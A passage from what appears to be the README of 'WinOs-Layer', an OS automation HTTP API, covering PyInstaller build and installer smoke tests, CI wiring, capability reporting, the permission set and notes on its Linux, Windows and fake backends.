python scripts/build_installer.py checksums
```

### Artifact smoke — always run the binary you built

A PyInstaller onefile build failing is a **runtime** event, not a build one: a
dropped hidden import produces a binary that builds green and dies on launch.
So the frozen artifact is never shipped without being executed:

```bash
python scripts/build_installer.py build-portable
python scripts/artifact_smoke.py --expect-backend linux    # or: windows
```

It starts `dist/winos-api(.exe)`, polls `/v1/health` over real HTTP, asserts the
served backend and version match this source tree, checks that `/v1/system` is
refused without an API key, then verifies the process exits and frees its port.
Exit 0 means the artifact is usable; any other exit means do not ship it.

On Windows the same guard runs a second time against the **installed** copy:

```bash
python scripts/installer_smoke.py     # Windows only
```

Silent install of `WinOsApi-Setup-<version>.exe` into a scratch directory, check
of the layout the `.iss` promises (`winos-api.exe`, `service/`, a non-empty
`api_key.txt`), `artifact_smoke` against the installed binary, then silent
uninstall with a check that nothing is left behind — including `api_key.txt`,
which `[Code]` generates outside `[Files]` and which the uninstaller therefore
had to be told explicitly to remove. It does **not** assert a
registered Windows service: the installer does not register one — that is a
separate manual step (`service/install_nssm.bat`).

Wired into both `Build` and `Build Linux` right after `build-portable`. The
`Build` workflow also runs on pull requests that touch packaging (`build.yml`,
`installer/`, `build_installer.py`, `artifact_smoke.py`, `windows_os_api/cli/`,
`pyproject.toml`), so a packaging change proves the artifact still runs before
it merges — without making every unrelated PR pay for a Windows runner.

Service name: `WindowsOSLayerService`. Default bind: `127.0.0.1:8765`.
Linux systemd: `installer/linux/winos-api.service` (LinuxBackend / auto).

## Capabilities honesty

`GET /v1/capabilities` reports `backend` plus `feature_flags` (`windows_ui`, `atspi`, `windows_uia=false` on Linux, etc.).
Do **not** claim Windows UIA on Linux. Process / FS / system / network on LinuxBackend are **real**.

## Push to GitHub

Repo target: https://github.com/zarbopiero963-droid/WinOs-Layer-

```bash
cd /workspace/WinOs-Layer-
git remote add origin https://github.com/zarbopiero963-droid/WinOs-Layer-.git
git push -u origin main
```

## Permissions

`system.read`, `filesystem.read/write`, `process.read/execute`, `ui.read/control`, `network.read`, `service.control`, `admin`, …

## Note

- **LinuxBackend**: real processes, sandbox FS, psutil network/users; X11 (wmctrl/xdotool) or Wayland (ydotool/wtype, wlrctl/swaymsg/hyprctl); clipboard; mss screenshots; pyatspi AT-SPI + **vision/OCR fallback** for canvas/games; pactl/wpctl audio; systemctl user/system services; gated privilege (`ADMIN` + `WINOS_ALLOW_PRIVILEGED`). Windows UIA is N/A on Linux by design.
- **FakeBackend**: Contoso CRM UI tree for adapter unit/E2E — `WINOS_BACKEND=fake` only.
- **WindowsBackend**: raises if instantiated off Win32; **real** UIA (`uiautomation` → `comtypes` → `pywinauto`), **SendInput** mouse/keyboard, **mss/Pillow/BitBlt** screenshots, EnumDisplayMonitors displays. Not a stub.
